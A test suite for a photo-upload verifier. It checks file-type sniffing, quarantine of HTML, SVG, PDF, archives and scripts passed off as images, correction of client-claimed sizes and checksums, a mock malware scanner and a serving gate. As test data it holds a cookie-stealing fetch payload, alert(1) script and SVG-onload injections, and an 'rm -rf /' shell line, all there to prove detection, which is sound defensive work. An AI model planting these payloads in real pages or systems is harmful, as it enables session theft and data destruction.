// Uploads are not what the browser says they are.
//
// Everything the uploader sends about a file — its type, its checksum, its
// dimensions — is attacker-controlled, and each one has a different
// consequence. These tests are written against the consequence rather than
// the mechanism, because the mechanism is easy to get subtly right and still
// have the wrong thing reach a person.

import { readFileSync, readdirSync } from "node:fs";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import { sha256 } from "@/lib/media";
import {
  ALLOWED_IMAGE_TYPES,
  dangerousType,
  extraDimensions,
  isAllowedType,
  SERVABLE_VERDICT,
  sniffType,
  verifyUpload,
} from "@/lib/media/verify";
import { EICAR, MockScanner, getScanner, scannerIsReal } from "@/lib/media/scanner";

const src = join(__dirname, "..", "src");

/**
 * Minimal but structurally real headers, built rather than checked in.
 *
 * The APP0 length is computed from its own payload rather than written by
 * hand. A hand-written one was wrong first time and the parser walked
 * straight past the SOF segment — which is exactly how a fixture ends up
 * testing nothing while passing.
 */
function jpeg(width: number, height: number): Buffer {
  const app0 = Buffer.concat([Buffer.from("JFIF\0"), Buffer.alloc(3)]);
  const length = Buffer.alloc(2);
  length.writeUInt16BE(app0.length + 2); // the length field counts itself
  const sof0 = Buffer.alloc(9);
  Buffer.from([0xff, 0xc0, 0x00, 0x11, 0x08]).copy(sof0, 0);
  sof0.writeUInt16BE(height, 5);
  sof0.writeUInt16BE(width, 7);
  return Buffer.concat([
    Buffer.from([0xff, 0xd8, 0xff, 0xe0]),
    length,
    app0,
    sof0,
    Buffer.alloc(64),
  ]);
}

const JPEG = jpeg(4000, 3000);

function png(width: number, height: number): Buffer {
  const b = Buffer.alloc(64);
  Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]).copy(b, 0);
  b.write("IHDR", 12, "latin1");
  b.writeUInt32BE(width, 16);
  b.writeUInt32BE(height, 20);
  return b;
}

const claimOf = (b: Buffer, over: Partial<Parameters<typeof verifyUpload>[1]> = {}) => ({
  mimeType: "image/jpeg",
  checksum: sha256(b),
  width: null,
  height: null,
  ...over,
});

describe("what a file actually is", () => {
  it("recognises the formats a phone produces", () => {
    expect(sniffType(JPEG)).toBe("image/jpeg");
    expect(sniffType(png(800, 600))).toBe("image/png");
    expect(sniffType(Buffer.from("GIF89a" + "\0".repeat(20)))).toBe("image/gif");

    const webp = Buffer.alloc(40);
    webp.write("RIFF", 0, "latin1");
    webp.write("WEBP", 8, "latin1");
    webp.write("VP8 ", 12, "latin1");
    expect(sniffType(webp)).toBe("image/webp");
  });

  it("tells HEIC apart from the audio that shares its container", () => {
    // Both are ISO base media files with an ftyp box; only the brand differs,
    // and getting this wrong would file a voice note as a photograph.
    const iso = (brand: string) =>
      Buffer.concat([Buffer.alloc(4), Buffer.from("ftyp" + brand, "latin1"), Buffer.alloc(16)]);
    expect(sniffType(iso("heic"))).toBe("image/heic");
    expect(sniffType(iso("mif1"))).toBe("image/heif");
    expect(sniffType(iso("M4A "))).toBe("audio/mp4");
    // An unknown brand is not guessed at.
    expect(sniffType(iso("qt  "))).toBeNull();
  });

  it("returns null rather than guessing at something unrecognised", () => {
    expect(sniffType(Buffer.from("just some text, quite a lot of it"))).toBeNull();
    expect(sniffType(Buffer.alloc(4))).toBeNull();
  });

  it("does not accept SVG, which is an image that runs script", () => {
    expect(isAllowedType("image/svg+xml")).toBe(false);
    expect(ALLOWED_IMAGE_TYPES).not.toContain("image/svg+xml" as never);
  });
});

describe("files that are dangerous under an image's name", () => {
  it("names what it found, so a refusal can say why", () => {
    expect(dangerousType(Buffer.from("<svg xmlns='...'><script/></svg>"))).toBe("SVG");
    expect(dangerousType(Buffer.from("<?xml version='1.0'?><svg></svg>"))).toBe("SVG");
    expect(dangerousType(Buffer.from("<!DOCTYPE html><html>"))).toBe("HTML");
    expect(dangerousType(Buffer.from("%PDF-1.7"))).toBe("PDF");
    expect(dangerousType(Buffer.from([0x50, 0x4b, 0x03, 0x04]))).toBe("an archive");
    expect(dangerousType(Buffer.from([0x7f, 0x45, 0x4c, 0x46]))).toBe("an executable");
    expect(dangerousType(Buffer.from("#!/bin/sh\nrm -rf /"))).toBe("a script");
  });

  it("sees through the leading whitespace a browser would skip", () => {
    // A browser sniffing for HTML ignores leading whitespace, so a check
    // anchored on the very first byte can be walked straight past.
    expect(dangerousType(Buffer.from("\n\n   \t<script>alert(1)</script>"))).toBe("HTML");
    expect(dangerousType(Buffer.from("   <SVG onload=alert(1)>"))).toBe("SVG");
  });

  it("leaves a real photograph alone", () => {
    expect(dangerousType(JPEG)).toBeNull();
    expect(dangerousType(png(10, 10))).toBeNull();
  });
});

describe("the verdict on an upload", () => {
  it("quarantines HTML no matter what the browser called it", () => {
    const evil = Buffer.from("<html><script>fetch('https://elsewhere/'+document.cookie)</script>");
    const out = verifyUpload(evil, claimOf(evil, { mimeType: "image/jpeg" }));
    expect(out.verdict).toBe("quarantined");
    expect(out.reason).toContain("not a photograph");
  });

  it("quarantines an empty file rather than storing a zero-byte photograph", () => {
    const out = verifyUpload(Buffer.alloc(0), claimOf(Buffer.alloc(0)));
    expect(out.verdict).toBe("quarantined");
  });

  it("keeps a real photo whose type the phone mislabelled, and corrects it", () => {
    // Phones send HEIC as application/octet-stream constantly. That is not
    // an attack and the parent should not lose the photo over it.
    const out = verifyUpload(png(800, 600), claimOf(png(800, 600), { mimeType: "application/octet-stream" }));
    expect(out.verdict).toBe("clean");
    expect(out.mimeType).toBe("image/png");
    expect(out.claimMismatch).toBe(true);
  });

  it("reads a JPEG's real size out of its SOF segment", () => {
    const out = verifyUpload(JPEG, claimOf(JPEG));
    expect(out.verdict).toBe("clean");
    expect({ width: out.width, height: out.height }).toEqual({ width: 4000, height: 3000 });
  });

  it("overwrites a lied-about size, because size decides how big it prints", () => {
    // Claiming 4000x3000 for a 400x300 image would place it full-page at
    // about 30 DPI — in a hardcover book someone paid A$199 for.
    const small = png(400, 300);
    const out = verifyUpload(small, claimOf(small, { width: 4000, height: 3000 }));
    expect(out.width).toBe(400);
    expect(out.height).toBe(300);
  });

  it("overwrites a wrong checksum, which is the duplicate key and the receipt", () => {
    const out = verifyUpload(JPEG, claimOf(JPEG, { checksum: "0".repeat(64) }));
    expect(out.checksum).toBe(sha256(JPEG));
  });

  it("reads dimensions for the formats readImageMeta does not cover", () => {
    const gif = Buffer.alloc(16);
    gif.write("GIF89a", 0, "latin1");
    gif.writeUInt16LE(320, 6);
    gif.writeUInt16LE(240, 8);
    expect(extraDimensions(gif)).toEqual({ width: 320, height: 240 });
  });

  it("leaves dimensions null for a format it cannot measure, rather than inventing them", () => {
    // Unknown means "place it small" downstream, which is the safe answer.
    const heic = Buffer.concat([Buffer.alloc(4), Buffer.from("ftypheic", "latin1"), Buffer.alloc(32)]);
    const out = verifyUpload(heic, claimOf(heic, { mimeType: "image/heic", width: 4032, height: 3024 }));
    expect(out.verdict).toBe("clean");
    expect(out.width).toBeNull();
  });
});

describe("the malware scanner", () => {
  it("flags EICAR, so the wiring can be proved without shipping malware", async () => {
    const found = await new MockScanner().scan(Buffer.from(EICAR));
    expect(found.infected).toBe(true);
    expect(found.signature).toBeTruthy();
  });

  it("passes an ordinary photograph", async () => {
    expect((await new MockScanner().scan(JPEG)).infected).toBe(false);
  });

  it("is honest about being a mock when no engine is configured", () => {
    // The privacy page prints "we scan every upload" only when this is true.
    // A promise backed by MockScanner would be a lie.
    delete process.env.CLAMD_HOST;
    expect(getScanner().name).toBe("mock");
    expect(scannerIsReal()).toBe(false);
  });
});

describe("the serving gate", () => {
  it("admits only 'clean' — not 'pending'", () => {
    // A backlog in the scan queue must not become an open door.
    expect(SERVABLE_VERDICT).toBe("clean");
  });

  it("is applied on every read of media_assets that ends in bytes reaching a person", () => {
    // A static check, deliberately. The failure this guards against is
    // someone adding a fifth place that resolves a storage path and not
    // knowing the gate exists — which no runtime test would catch.
    const gated = [
      "src/lib/book/photos.ts",            // previews and the editor
      "src/app/api/media/signed-url/route.ts", // direct fetches
      "src/lib/jobs/handlers.ts",          // pagination and the print render
      "src/lib/privacy/export.ts",         // the family's own copy
    ];
    for (const file of gated) {
      const code = readFileSync(join(src, "..", file), "utf8");
      expect(code, `${file} reads media_assets without the gate`).toContain("SERVABLE_VERDICT");
    }
  });

  it("has no ungated read left anywhere else in the codebase", () => {
    const offenders: string[] = [];
    const walk = (dir: string) => {
      for (const entry of readdirSync(dir, { withFileTypes: true })) {
        const path = join(dir, entry.name);
        if (entry.isDirectory()) {
          walk(path);
          continue;
        }
        if (!/\.tsx?$/.test(entry.name)) continue;
        const code = readFileSync(path, "utf8");
        if (!/from\(["']media_assets["']\)/.test(code)) continue;
        // Writes and deletions are not serving paths.
        const reads = [...code.matchAll(/from\(["']media_assets["']\)\s*\n?\s*\.select/g)];
        if (reads.length === 0) continue;
        if (!code.includes("SERVABLE_VERDICT")) offenders.push(path.replace(src, "src"));
      }
    };
    walk(src);
    // Known and deliberate. Each of these reads media_assets without ever
    // producing a storage path or a URL, so there is nothing for the gate to
    // stand in front of. Adding to this list should feel like a decision.
    const allowed = [
      "src/lib/supabase/demo.ts",              // fixture rows; no storage behind them
      "src/lib/privacy/erase.ts",              // a deletion — it wants the ungated rows
      "src/app/actions.ts",                    // checksums, for duplicate detection
      "src/app/api/media/verdicts/route.ts",   // returns the verdict itself, never a path
      // Counts files still awaiting their check, for a support view. Asks
      // for pending rows specifically, selects no storage_path, and returns
      // a number — tests/support-view.test.ts holds it to all three.
      "src/lib/family/support-view.ts",
    ];
    expect(offenders.filter((f) => !allowed.includes(f))).toEqual([]);
  });
});
